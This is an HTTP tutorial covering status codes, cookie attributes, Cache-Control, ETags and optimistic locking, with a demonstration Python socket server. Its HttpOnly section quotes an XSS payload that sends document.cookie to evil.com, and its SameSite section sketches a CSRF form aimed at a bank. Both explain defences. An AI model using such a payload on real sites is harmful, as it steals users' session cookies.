### 1. HTTP Status Code Semantics

HTTP status codes are 3-digit integers defined by RFC 9110 that strictly categorize the outcome of a request. The first digit defines the response class:

- **1xx (Informational):** The request was received, and the process is continuing. Example: `101 Switching Protocols` (used in WebSocket upgrades).

- **2xx (Successful):** The action was successfully received, understood, and accepted. Example: `201 Created` indicates a resource was definitively generated.

- **3xx (Redirection):** Further action must be taken by the client to complete the request. Example: `301 Moved Permanently` instructs clients to update their cached URI.

- **4xx (Client Error):** The request contains bad syntax or cannot be fulfilled due to client-side faults. Example: `401 Unauthorized` (missing authentication) or `404 Not Found`.

- **5xx (Server Error):** The server failed to fulfill a valid request due to an internal fault. Example: `502 Bad Gateway` indicates an upstream proxy failure.

### 2. Cookies and State Management

Because HTTP is fundamentally stateless, RFC 6265 introduces cookies as a mechanism to persist state across discrete TCP connections.

- **Transmission Mechanism:** The server issues a `Set-Cookie: <key>=<value>` header in its response. The client’s OS/browser stores this and automatically appends a `Cookie: <key>=<value>` header to all subsequent requests to that domain.
- **Security Attributes:** Attributes like `HttpOnly` strictly hide the cookie from client-side JavaScript execution (mitigating XSS), while `Secure` mandates transmission exclusively over TLS.

### 3. Caching Headers

Caching directives explicitly control how responses are stored in client-side or intermediary memory buffers.

- **Cache-Control:** The modern standard for defining cache behavior. Directives like `max-age=3600` define the absolute lifespan in seconds.
- **Constraints:** `no-store` explicitly forbids storing any part of the request/response, whereas `no-cache` allows storage but mandates revalidation with the origin server before use.

### 4. ETags and Conditional Requests

When cache expiration occurs, conditional requests prevent the unnecessary retransmission of unchanged payload bodies.

- **ETag (Entity Tag):** An opaque string (often a cryptographic hash) generated by the server representing a specific, versioned state of a resource.

- **Revalidation Mechanism:** The client issues a `GET` request appending the `If-None-Match: <ETag>` header. The server compares this string to the resource's current ETag.
- **Bandwidth Optimization:** If the ETags match, the server aborts sending the payload and returns a `304 Not Modified` status, instructing the client to reuse its cached copy.

#### A. 1xx: Informational Status Codes

- **`100 Continue`:** Sent by the server upon receiving a request containing `Expect: 100-continue` in the headers.
- _Underlying Mechanism:_ A client wishing to upload a 5 GB file sends only the headers first with `Expect: 100-continue`. If the server checks auth/permissions and approves, it returns `HTTP/1.1 100 Continue`. Only then does the client start transmitting the 5 GB body across the TCP socket. If unauthorized, the server returns `401`/`403` immediately, saving 5 GB of wasted network transfer.

- **`101 Switching Protocols`:** Used during the **WebSocket Upgrade handshake**. The client requests an upgrade (`Upgrade: websocket`, `Connection: Upgrade`), and the server replies with `101 Switching Protocols`. Immediately following the `\r\n\r\n` delimiter of the 101 response, the TCP stream ceases to parse HTTP framing and transitions entirely to the binary WebSocket framing protocol.
- **`103 Early Hints`:** Sent by the server while it is still computing the main response (e.g., waiting for database queries). It contains `Link` headers advising the browser to begin preloading critical CSS/JS assets over TLS/TCP before the main HTML is even ready.

---

#### B. 2xx: Successful Status Codes

- **`200 OK`:** Standard response indicating the payload matching the request is enclosed in the response body.
- **`201 Created`:** The request has been fulfilled and has resulted in one or more new resources being created.
- _Wire Invariant:_ The server **must** include a `Location:` header pointing to the URI of the newly created resource (e.g., `Location: /api/v1/users/8492`).

- **`202 Accepted`:** The request has been accepted for processing, but the processing has not been completed. Used in asynchronous, distributed message architectures (e.g., batch processing, video encoding pipelines). The payload typically contains a polling URI or job ID.
- **`204 No Content`:** The server has successfully fulfilled the request and there is **no additional content to send in the response payload**.
- _Strict Protocol Invariant:_ A `204` response **must not contain a message body** (`Content-Length` must be `0` or absent; no bytes after `\r\n\r\n`). Browsers receiving `204` do not refresh or change the active document view.

- **`206 Partial Content`:** Sent when the client requests a specific sub-range of a resource using the `Range: bytes=0-1048575` header (e.g., video streaming playback, multi-threaded download managers). The response includes a `Content-Range: bytes 0-1048575/52428800` header.

#### C. 3xx: Redirection & The Method Mutation Trap

Redirection codes instruct the client to issue a new request to a different URI specified in the `Location:` header.

```
+---------------------------------------------------------------------------------------------------+
| CODE | NAME               | CACHEABLE?      | METHOD PRESERVATION BEHAVIOR                        |
+------+--------------------+-----------------+-----------------------------------------------------+
| 301  | Moved Permanently  | YES (Aggressive)| HISTORICAL: Mutates POST -> GET.                    |
+------+--------------------+-----------------+-----------------------------------------------------+
| 302  | Found              | NO (Default)    | HISTORICAL: Mutates POST -> GET.                    |
+------+--------------------+-----------------+-----------------------------------------------------+
| 303  | See Other          | NO              | EXPLICIT: Always rewrites method to GET.            |
+------+--------------------+-----------------+-----------------------------------------------------+
| 304  | Not Modified       | YES             | CONDITIONAL CACHE HIT: Zero message body.           |
+------+--------------------+-----------------+-----------------------------------------------------+
| 307  | Temporary Redirect | NO              | STRICT: MUST NOT mutate method (POST remains POST). |
+------+--------------------+-----------------+-----------------------------------------------------+
| 308  | Permanent Redirect | YES (Aggressive)| STRICT: MUST NOT mutate method (POST remains POST). |
+---------------------------------------------------------------------------------------------------+

```

#### The Historical 301/302 Method Mutation Bug

In the early days of HTTP/1.0, web browsers implemented `301 Moved Permanently` and `302 Found` incorrectly: when a client submitted a `POST /checkout` and the server responded with `302 Found` (`Location: /receipt`), the browser automatically **rewrote the method to `GET /receipt**` and dropped the payload body.

While technically violating protocol invariants, this pattern became standard web behavior (the Post/Redirect/Get pattern). To resolve this ambiguity, HTTP/1.1 (RFC 7231 / RFC 9110) formally split redirection into four explicit tools:

1. **Use `303 See Other**`when you *explicitly want* the browser to redirect a`POST`submission to a`GET` endpoint.
2. **Use `307 Temporary Redirect**`when you want a temporary redirect that **guarantees the client will preserve the exact HTTP method and body** (a`POST`to`/v1/upload`redirected with 307 will send a`POST`with the full body to`/v2/upload`).
3. **Use `308 Permanent Redirect**`for the permanent equivalent of 307 (strictly preserving`POST`/`PUT`/`DELETE` methods and bodies across permanent migrations).

#### D. 4xx: Client Error Status Codes

- **`400 Bad Request`:** The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed HTTP framing, invalid JSON syntax, routing violations).
- **`401 Unauthorized`:** **Authentication is required and has failed or has not yet been provided.**
- _Wire Invariant:_ The server **must** return a `WWW-Authenticate:` header specifying the authentication scheme supported (e.g., `WWW-Authenticate: Bearer realm="api"`, `Basic realm="secure"`).

- **`403 Forbidden`:** The server understood the request and the client’s identity is verified, but the server **refuses to authorize access**. Unlike `401`, providing credentials will not help because the user does not possess sufficient RBAC/permission scopes.
- **`404 Not Found`:** The origin server did not find a current representation for the target resource URI.
- **`405 Method Not Allowed`:** The target resource does not support the method used in the Request-Line.
- _Wire Invariant:_ The server **must** return an `Allow:` header listing the valid methods for that URI (e.g., `Allow: GET, HEAD, OPTIONS`).

- **`409 Conflict`:** The request could not be completed due to a conflict with the current state of the target resource (e.g., creating a user with an email that already exists, or Git merge conflicts over WebDAV).
- **`410 Gone`:** The target resource is no longer available at the origin server and **no forwarding address is known**. This condition is expected to be permanent. Search engines receiving a `410` purge the URL from their index immediately, whereas `404` causes repeated retries.
- **`412 Precondition Failed`:** Evaluated during conditional requests (`If-Match`, `If-Unmodified-Since`). The server evaluated one or more preconditions in the request headers and determined they evaluated to `false` (see _Optimistic Concurrency Control_ below).
- **`429 Too Many Requests`:** The client has sent too many requests in a given amount of time (Rate Limiting).
- _Best Practice Header:_ The server should include a `Retry-After: 60` (seconds) or `Retry-After: Wed, 19 Aug 2026 23:59:59 GMT` header indicating when to retry.

---

#### E. 5xx: Server Error Status Codes

- **`500 Internal Server Error`:** The server encountered an unexpected condition that prevented it from fulfilling the request (e.g., unhandled runtime exception, null pointer, database connection pool exhaustion).
- **`502 Bad Gateway`:** The server, while acting as a gateway or reverse proxy (e.g., NGINX, Cloudflare), received an **invalid, corrupt, or unparseable response from the inbound upstream backend** (e.g., the Node.js/Go backend crashed mid-transmission or sent malformed bytes).
- **`503 Service Unavailable`:** The server is currently unable to handle the request due to temporary overloading or maintenance.
- **`504 Gateway Timeout`:** The server, while acting as a gateway or proxy, **did not receive a timely response from an upstream server** (e.g., NGINX timed out after waiting 60s for a slow Python backend to finish an expensive SQL query).

### 2. HTTP State Management: Cookies (`RFC 6265bis`)

Because TCP/HTTP are stateless, cookies allow origin servers to maintain state across independent HTTP transactions by offloading opaque key-value records to client-side storage.

```
                              THE COOKIE LIFECYCLE

Client (Browser)                                                     Origin Server
      │                                                                    │
      │── 1. POST /login (Credentials: user/pass) ────────────────────────►│ [Validates Auth]
      │                                                                    │ [Generates Token]
      │◄── 2. HTTP/1.1 200 OK ─────────────────────────────────────────────┤
      │   Set-Cookie: sid=a9f82c; Secure; HttpOnly; SameSite=Strict;       │
      │               Domain=example.com; Path=/; Max-Age=86400            │
      │                                                                    │
      │ [Stores in Browser Secure Cookie Jar]                              │
      │                                                                    │
      │── 3. GET /account/dashboard ──────────────────────────────────────►│ [Reads sid=a9f82c]
      │   Host: example.com                                                │ [Identifies User]
      │   Cookie: sid=a9f82c                                               │
      │                                                                    │
      │◄── 4. HTTP/1.1 200 OK (Dashboard HTML) ────────────────────────────┤

```

#### A. Wire Format: `Set-Cookie` vs. `Cookie`

1. **Server-to-Client (`Set-Cookie` response header):**

```http
Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Path=<path-value>; Max-Age=<number>; Secure; HttpOnly; SameSite=<Strict|Lax|None>

```

2. **Client-to-Server (`Cookie` request header):**
   When the browser matches the domain, path, and security constraints, it serializes all active cookies as a single semicolon-delimited string:

```http
Cookie: sid=a9f82c; theme=dark; user_lang=en

```

_Notice:_ The client sends **only** the name-value pairs. None of the security flags (`HttpOnly`, `SameSite`, `Max-Age`) are transmitted back to the server.

#### B. The Exhaustive Cookie Attributes Deep Dive

```
+---------------------------------------------------------------------------------------------------+
| ATTRIBUTE      | PURPOSE & MECHANISM                                                              |
+----------------+----------------------------------------------------------------------------------+
| HttpOnly       | Blocks access to `document.cookie` via JavaScript. Mitigates XSS token theft.    |
+----------------+----------------------------------------------------------------------------------+
| Secure         | Browser only transmits the cookie over encrypted TLS (HTTPS) connections.        |
+----------------+----------------------------------------------------------------------------------+
| Domain         | Defines the host scope. If omitted, defaults strictly to current host (no subs). |
+----------------+----------------------------------------------------------------------------------+
| Path           | Defines the URI path prefix scope (e.g., `Path=/admin`). Default is `/`.        |
+----------------+----------------------------------------------------------------------------------+
| Max-Age        | Relative lifetime in seconds. Takes precedence over `Expires`. `0` = Delete.     |
+----------------+----------------------------------------------------------------------------------+
| Expires        | Absolute expiration date in HTTP-date format (legacy).                           |
+----------------+----------------------------------------------------------------------------------+
| SameSite       | Cross-Site Request Forgery (CSRF) defense: `Strict`, `Lax`, or `None`.           |
+----------------+----------------------------------------------------------------------------------+

```

1. **`HttpOnly` (The XSS Defense Boundary):**

- If an attacker injects a malicious script via Cross-Site Scripting (XSS): `<script>fetch('[http://evil.com/?steal=](http://evil.com/?steal=)' + document.cookie)</script>`.
- If a cookie has `HttpOnly`, the browser's JavaScript engine returns an empty string for that cookie name. The cookie remains accessible _only_ to the browser's internal C++ network stack during HTTP dispatches.

2. **`Secure` (The Plaintext Sniffing Defense):**

- Forces the browser to discard the cookie if an outbound request is addressed to unencrypted `http://`. Prevents Man-in-the-Middle (MITM) attackers on open Wi-Fi networks from sniffing session identifiers.

3. **`Domain` Scoping & Subdomain Inheritance:**

- **Host-Only Cookie (Default):** If the server sets `Set-Cookie: id=123` (no `Domain` attribute declared), the cookie is strictly scoped to `api.example.com`. It will **not** be sent to `sub.api.example.com` or `example.com`.
- **Explicit Domain:** If the server sets `Set-Cookie: id=123; Domain=example.com`, the browser automatically includes this cookie in requests to `example.com` **and all its subdomains** (`api.example.com`, `auth.example.com`).

4. **`SameSite` (The CSRF Defense Matrix):**

- **The Attack Scenario (Cross-Site Request Forgery):** A user is logged into `bank.com`. The user visits an attacker's site `evil.com`. `evil.com` executes a hidden background form: `<form action="[https://bank.com/transfer](https://bank.com/transfer)" method="POST">`. The browser historically attached the user's `bank.com` session cookies automatically.

```
+-----------------------------------------------------------------------------------------------+
| SAMESITE POLICY | BEHAVIOR ON CROSS-SITE POST / EMBED | BEHAVIOR ON TOP-LEVEL LINK NAVIGATION |
+-----------------+-------------------------------------+---------------------------------------+
| Strict          | COOKIE BLOCKED                      | COOKIE BLOCKED                        |
+-----------------+-------------------------------------+---------------------------------------+
| Lax (Default)   | COOKIE BLOCKED                      | COOKIE SENT (Safe methods: GET only)  |
+-----------------+-------------------------------------+---------------------------------------+
| None            | COOKIE SENT (Requires `Secure`)     | COOKIE SENT                           |
+-----------------------------------------------------------------------------------------------+

```

- **`SameSite=Strict`:** The cookie is _never_ sent in cross-site requests. If you click an external link to `bank.com` from a Google search, you arrive at `bank.com` logged out until you refresh or click an internal link.
- **`SameSite=Lax`:** Default in modern browsers. Blocks cookies on cross-site subrequests (`<img>`, `<iframe>`, `POST` forms), but allows cookies when the user performs a **top-level navigation via a safe method** (clicking a regular `<a href>` link that performs a `GET`).
- **`SameSite=None`:** Disables all cross-site protections (used for third-party embeds, widgets). Browsers enforce that `SameSite=None` **must** be paired with the `Secure` flag.

### 3. HTTP Caching Headers Deep Dive

HTTP caching (RFC 9111) eliminates redundant round-trips, conserves network bandwidth, and reduces server load by enabling clients and intermediate proxies (CDNs, forward proxies, reverse caches) to store and reuse responses.

```
                              HTTP CACHE TOPOLOGY

[ Client (Browser) ] ──────► [ Shared Cache (CDN / Edge) ] ──────► [ Origin Server ]
   Private Cache                 Public / Shared Cache                 Source of Truth
   (Disk / RAM)                  (Cloudflare, Akamai)

```

```
+---------------------------------------------------------------------------------------------------+
| DIRECTIVE              | SCOPE         | SEMANTIC BEHAVIOR & WIRE INVARIANT                       |
+------------------------+---------------+----------------------------------------------------------+
| max-age=N              | Private/Shared| Freshness lifetime in seconds. Cache serves locally.     |
+------------------------+---------------+----------------------------------------------------------+
| s-maxage=N             | Shared Only   | Overrides `max-age` specifically for shared caches (CDNs)|
+------------------------+---------------+----------------------------------------------------------+
| public                 | Shared/Private| Any intermediate proxy may cache, even if Authenticated. |
+------------------------+---------------+----------------------------------------------------------+
| private                | Private Only  | Only the end-user's browser may cache; CDNs must NOT.    |
+------------------------+---------------+----------------------------------------------------------+
| no-cache               | All           | MUST revalidate with origin via ETag/Date before serving.|
+------------------------+---------------+----------------------------------------------------------+
| no-store               | All           | NEVER write payload to storage (RAM or Disk).            |
+------------------------+---------------+----------------------------------------------------------+
| must-revalidate        | All           | Once stale, NEVER serve stale data without revalidation. |
+------------------------+---------------+----------------------------------------------------------+
| immutable              | All           | Content will NEVER change; never revalidate while fresh. |
+------------------------+---------------+----------------------------------------------------------+
| stale-while-revalidate | All           | Serve stale copy immediately while revalidating in async.|
+---------------------------------------------------------------------------------------------------+

```

#### The Fundamental Distinction: `no-cache` vs. `no-store`

- **`Cache-Control: no-cache` (Revalidate Every Time):**
- It does **not** mean "do not cache."
- The cache **stores** the response on disk. However, before serving that cached representation to the application, it **must send a conditional request (`If-None-Match`) to the origin server** to confirm the content is still valid.
- If valid, the server returns `304 Not Modified` and the cache serves the stored copy without re-downloading the body.

- **`Cache-Control: no-store` (Zero Persistence):**
- The cache (and browser) is strictly forbidden from writing any part of the request or response to volatile or non-volatile storage.
- Used exclusively for sensitive, dynamic data (banking transactions, PII, credit card details, medical records).

#### Cache Freshness Calculation

An intermediary evaluates whether a stored representation is fresh using:

$$\text{Freshness Lifetime} = \text{max-age (or s-maxage)}$$

$$\text{Current Age} = \text{Age header value} + (\text{Current Time} - \text{Response Time})$$

$$\text{Is Fresh} \iff \text{Current Age} < \text{Freshness Lifetime}$$

If fresh, the cache responds immediately with `HTTP/1.1 200 OK` (often with an added `Age: <seconds>` header) without dispatching any packets to the origin.

### 4. ETags & Conditional Requests (`RFC 9110 §13`)

When a cached response becomes stale (`Current Age > Freshness Lifetime`), the cache must not blindly discard it. Instead, it executes **Cache Revalidation** using conditional request headers.

```
                              THE REVALIDATION DIALOGUE (304 NOT MODIFIED)

Client (Browser / Cache)                                             Origin Server
      │                                                                    │
      │── 1. Initial Request: GET /app.js ────────────────────────────────►│
      │                                                                    │
      │◄── 2. HTTP/1.1 200 OK ─────────────────────────────────────────────┤
      │   ETag: "v1.4-8f92a"                                               │
      │   Cache-Control: public, max-age=60                                │
      │   Content-Length: 1048576 (1 MB payload)                           │
      │                                                                    │
      │ [Stores 1 MB payload in Cache. 60 seconds pass -> Stale]           │
      │                                                                    │
      │── 3. Conditional Request: GET /app.js ────────────────────────────►│ [Compares incoming ETag]
      │   If-None-Match: "v1.4-8f92a"                                      │ [Matches current hash!]
      │                                                                    │
      │◄── 4. HTTP/1.1 304 Not Modified ───────────────────────────────────┤ [Generates ZERO body bytes]
      │   ETag: "v1.4-8f92a"                                               │
      │   Cache-Control: public, max-age=60                                │
      │                                                                    │
      │ [Cache resets freshness timer to 60s; serves stored 1 MB copy]     │

```

#### A. Validators: Strong vs. Weak ETags

An Entity Tag (ETag) is an opaque string token generated by the server representing a specific version of a resource (typically a cryptographic hash of the content, such as `MD5(body)` or `SHA256(body)`).

1. **Strong ETag (`ETag: "686897696a7c876b7e"`):**

- Guarantees byte-for-byte binary equivalence.
- If even a single byte or bit in the payload changes, the strong ETag must change. Mandatory for sub-range requests (`Range: bytes=...`).

2. **Weak ETag (`ETag: W/"686897696a7c876b7e"`):**

- Prefixed by `W/`.
- Guarantees semantic equivalence, but not necessarily binary identity (e.g., two HTML documents with different whitespace or reordered table columns that render identically).

#### B. The Conditional Request Headers Matrix

```
+---------------------------------------------------------------------------------------------------+
| HEADER               | VALIDATOR CHECKED  | EVALUATION CONDITION & STATUS RETURNED                |
+----------------------+--------------------+-------------------------------------------------------+
| If-None-Match        | ETag               | If ETag MATCHES current -> Return `304 Not Modified`. |
|                      |                    | If ETag DIFFERS -> Return `200 OK` + full new body.   |
+----------------------+--------------------+-------------------------------------------------------+
| If-Modified-Since    | Last-Modified date | If NOT modified since date -> Return `304 Not Mod`.   |
|                      |                    | If modified since date -> Return `200 OK` + full body.|
+----------------------+--------------------+-------------------------------------------------------+
| If-Match             | ETag               | If ETag MATCHES -> Execute operation (`PUT`/`DELETE`).|
|                      |                    | If ETag MISMATCHES -> Abort with `412 Precondition`.  |
+----------------------+--------------------+-------------------------------------------------------+
| If-Unmodified-Since  | Last-Modified date | If UNMODIFIED -> Execute mutation.                    |
|                      |                    | If MODIFIED -> Abort with `412 Precondition Failed`.  |
+---------------------------------------------------------------------------------------------------+

```

#### C. Preventing the "Lost Update" Problem (Optimistic Locking via `If-Match`)

In distributed REST APIs, two clients may fetch a resource simultaneously, modify it locally, and push updates back via `PUT`. Without concurrency control, the second write silently overwrites the first write (the **Lost Update Problem**).

```
Client 1                                   Origin Server                                  Client 2
   │                                             │                                           │
   │── GET /doc/1 ──────────────────────────────►│                                           │
   │◄── 200 OK (ETag: "A") ──────────────────────┤                                           │
   │                                             │◄── GET /doc/1 ────────────────────────────┤
   │                                             ├──── 200 OK (ETag: "A") ──────────────────►│
   │                                             │                                           │
   │── PUT /doc/1 (If-Match: "A") ──────────────►│ [ETag matches "A" -> Applied!]            │
   │◄── 200 OK (New ETag: "B") ──────────────────┤ [Master ETag is now "B"]                  │
   │                                             │                                           │
   │                                             │◄── PUT /doc/1 (If-Match: "A") ────────────┤
   │                                             │    [Incoming "A" != Current "B"!]         │
   │                                             ├──── 412 Precondition Failed ─────────────►│
   │                                             │    [Mid-Air Collision Prevented!]         │

```

### Phase 4: Architecture & Deliberate Breakage

Here is a bare-metal Python HTTP/1.1 socket server implementing full stateful cookie parsing, cache headers, dynamic SHA-256 ETag generation, `304 Not Modified` short-circuiting, and `If-Match` concurrency locking.

#### The Advanced State & Cache Socket Server (`state_server.py`)

```python
import socket
import hashlib
import json

# Master in-memory database
RESOURCE = {
    "title": "System Architecture Specification",
    "version": 1,
    "content": "This document covers transport and application layer invariants."
}

def calculate_etag(data_dict):
    """Generates a strong ETag based on SHA-256 hash of JSON representation."""
    serialized = json.dumps(data_dict, sort_keys=True).encode('utf-8')
    return f'"{hashlib.sha256(serialized).hexdigest()[:16]}"'

def run_server():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('127.0.0.1', 8082))
    srv.listen(5)
    print("[*] State & Cache HTTP/1.1 Server listening on http://127.0.0.1:8082")

    while True:
        conn, addr = srv.accept()
        raw = b""
        while b"\r\n\r\n" not in raw:
            chunk = conn.recv(1024)
            if not chunk:
                break
            raw += chunk

        if not raw:
            conn.close()
            continue

        header_bytes, _, body_bytes = raw.partition(b"\r\n\r\n")
        lines = header_bytes.decode('iso-8859-1').splitlines()
        if not lines:
            conn.close()
            continue

        method, path, version = lines[0].split(" ")
        headers = {}
        for line in lines[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip().lower()] = v.strip()

        # Read remaining body if Content-Length present
        content_len = int(headers.get("content-length", 0))
        body = body_bytes
        while len(body) < content_len:
            body += conn.recv(content_len - len(body))

        # Parse Cookies
        cookies = {}
        if "cookie" in headers:
            for pair in headers["cookie"].split(";"):
                if "=" in pair:
                    ck, cv = pair.strip().split("=", 1)
                    cookies[ck] = cv

        # Route Handling
        resp_status = "200 OK"
        resp_headers = {"Connection": "close"}
        resp_body = b""

        # Route 1: Authentication / Cookie Issuance
        if path == "/login" and method == "POST":
            resp_status = "200 OK"
            resp_headers["Set-Cookie"] = "session_id=secure_token_999; Path=/; HttpOnly; SameSite=Strict"
            resp_body = b'{"auth": "success"}'
            resp_headers["Content-Type"] = "application/json"

        # Route 2: State Inspection via Cookies
        elif path == "/dashboard" and method == "GET":
            if cookies.get("session_id") == "secure_token_999":
                resp_status = "200 OK"
                resp_body = b'{"view": "Authorized Admin Dashboard"}'
            else:
                resp_status = "401 Unauthorized"
                resp_headers["WWW-Authenticate"] = 'Cookie realm="dashboard"'
                resp_body = b'{"error": "Missing or invalid session cookie"}'
            resp_headers["Content-Type"] = "application/json"

        # Route 3: ETag & Conditional Revalidation
        elif path == "/document" and method == "GET":
            current_etag = calculate_etag(RESOURCE)
            client_etag = headers.get("if-none-match")

            resp_headers["ETag"] = current_etag
            resp_headers["Cache-Control"] = "public, max-age=30, must-revalidate"

            if client_etag == current_etag:
                # 304 Not Modified Invariant: ZERO BODY
                resp_status = "304 Not Modified"
                resp_body = b""
            else:
                resp_status = "200 OK"
                resp_body = json.dumps(RESOURCE).encode('utf-8')
                resp_headers["Content-Type"] = "application/json"

        # Route 4: Optimistic Concurrency Control (Mid-Air Collision Guard)
        elif path == "/document" and method == "PUT":
            current_etag = calculate_etag(RESOURCE)
            if_match = headers.get("if-match")

            if not if_match:
                resp_status = "428 Precondition Required"
                resp_body = b'{"error": "PUT requires If-Match header with current ETag"}'
                resp_headers["Content-Type"] = "application/json"
            elif if_match != current_etag:
                resp_status = "412 Precondition Failed"
                resp_body = b'{"error": "Mid-air collision detected. Stale ETag provided."}'
                resp_headers["Content-Type"] = "application/json"
            else:
                try:
                    payload = json.loads(body.decode('utf-8'))
                    RESOURCE["title"] = payload.get("title", RESOURCE["title"])
                    RESOURCE["content"] = payload.get("content", RESOURCE["content"])
                    RESOURCE["version"] += 1

                    new_etag = calculate_etag(RESOURCE)
                    resp_status = "200 OK"
                    resp_headers["ETag"] = new_etag
                    resp_body = json.dumps(RESOURCE).encode('utf-8')
                    resp_headers["Content-Type"] = "application/json"
                except Exception as e:
                    resp_status = "400 Bad Request"
                    resp_body = str(e).encode('utf-8')
                    resp_headers["Content-Type"] = "text/plain"

        else:
            resp_status = "404 Not Found"
            resp_body = b"Not Found"
            resp_headers["Content-Type"] = "text/plain"

        # Construct Wire Response
        if resp_status != "304 Not Modified":
            resp_headers["Content-Length"] = str(len(resp_body))

        status_line = f"HTTP/1.1 {resp_status}\r\n"
        hdr_lines = "".join(f"{k}: {v}\r\n" for k, v in resp_headers.items())
        final_wire_bytes = status_line.encode('ascii') + hdr_lines.encode('ascii') + b"\r\n" + resp_body

        conn.sendall(final_wire_bytes)
        conn.close()

if __name__ == "__main__":
    run_server()

```

### Phase 5: The Invariant & The Capstone

#### The Non-Negotiable Invariant

> **HTTP is fundamentally stateless at the wire layer; all state, caching guarantees, and concurrency protections are explicitly negotiated through metadata headers on every single request-response cycle.**
> A `304 Not Modified` strictly forbids a payload body, cookies must be defended at the browser-network boundary via `HttpOnly`/`Secure`/`SameSite`, and distributed mutations across untrusted networks require explicit precondition validation (`If-Match`) to prevent silent data corruption.
